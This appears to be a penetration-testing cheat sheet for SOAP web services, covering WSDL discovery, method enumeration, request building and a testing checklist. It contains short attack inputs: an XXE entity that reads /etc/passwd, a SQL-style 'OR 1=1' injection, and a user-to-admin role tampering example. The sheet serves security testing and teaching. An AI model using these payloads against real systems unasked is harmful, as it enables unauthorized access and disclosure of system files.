### WSDL Fundamentals

----

WSDL (Web Services Description Language) = XML describing a SOAP API

Defines:
+ Available methods
+ Input/output parameters
+ Endpoints
+ Data types

Key Elements
```
<definitions>   <!-- root -->
<types>         <!-- data structures -->
<message>       <!-- input/output -->
<portType>      <!-- operations (functions) -->
<binding>       <!-- protocol (SOAP) -->
<service>       <!-- endpoint URL -->
```

What to extract immediately when you find a WSDL:
+ Endpoint URL
+ Available operations (methods)
+ Parameters (names + types)
+ SOAPAction headers
+ Authentication hints (tokens, headers)

Typical access points
```
/service?wsdl
/service?WSDL
/service.wsdl
/wsdl
/api?wsdl
```

Quick curl check
```
curl -s http://target.com/service?wsdl
```

----

### WSDL Disclosure & Method Enumeration

1. Locate WSDL
```
ffuf -u http://target.com/FUZZ -w common.txt
```
Look for:
```
?wsdl
.wsdl
```

2. Parse WSDL manually
```
<operation name="GetUser">
<operation name="Login">
<operation name="AdminAction">
```
These are your attack entry points.

3. Extract SOAPAction
```
soapAction="http://example.com/GetUser"
```
Used in headers:
```
SOAPAction: "http://example.com/GetUser"
```

4. Build request template

Basic SOAP request:
```
POST /service HTTP/1.1
Host: target.com
Content-Type: text/xml
SOAPAction: "GetUser"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Body>
      <GetUser>
         <id>1</id>
      </GetUser>
   </soapenv:Body>
</soapenv:Envelope>
```

5. Automate enumeration

Tools:
+ Burp Suite (Repeater / Intruder)
+ SoapUI
+ Custom scripts (curl / python)

----

### Tests to do

Input fuzzing:
+ Missing params
+ Extra params
+ Type confusion (int → string)
+ Large payloads

Auth bypass:
+ No token
+ Empty token
+ Modified token

IDOR:
```
<id>2</id> → <id>999</id>
```

----

### Common vulnerabilities

1. Sensitive method exposure
+ Admin*
+ DeleteUser
+ ResetPassword

2. Verbose errors
+ Stack traces
+ Internal paths
+ SQL errors

3. Parameter tampering
```
<role>user</role> → <role>admin</role>
```

4. SOAP injection
```
<id>1</id>
<id>1 OR 1=1</id>
```

5. XML / XXE (if parser vulnerable)
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

### Fast checklist
```
[ ] Found WSDL?
[ ] Extracted all operations?
[ ] Built working SOAP request?
[ ] Tested auth?
[ ] Tested IDOR?
[ ] Fuzzed parameters?
[ ] Checked for hidden/admin methods?
```